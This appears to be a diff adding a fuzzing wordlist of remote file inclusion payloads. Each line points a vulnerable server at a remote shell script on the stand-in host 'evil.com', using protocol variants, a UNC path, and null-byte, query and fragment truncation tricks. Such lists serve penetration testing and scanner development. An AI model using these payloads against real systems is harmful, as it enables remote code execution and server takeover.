@@ -1,0 +1,8 @@
+http://evil.com/shell.txt
+https://evil.com/shell.txt
+//evil.com/shell.txt
+ftp://evil.com/shell.txt
+\\\evil.com\shell.txt
+http://evil.com/shell.txt%00
+http://evil.com/shell.txt?
+http://evil.com/shell.txt#
